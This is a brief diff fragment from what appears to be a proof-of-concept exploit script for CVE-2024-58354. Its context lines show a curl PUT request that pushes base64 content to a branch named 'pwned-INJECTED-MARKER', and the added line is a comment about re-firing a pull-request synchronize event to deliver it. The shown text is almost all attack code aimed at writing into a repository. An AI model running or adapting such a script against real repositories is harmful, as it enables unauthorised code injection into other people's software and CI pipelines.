@@ -40,3 +40,5 @@ curl -sS -m 30 -X PUT \
   -d "{\"message\":\"CVE-2024-58354\",\"content\":\"${B64}\",\"branch\":\"pwned-INJECTED-MARKER-cve-2024-58354-4398aa736696\"}"
 
 exit 0
+
+# re-fire synchronize for PR delivery
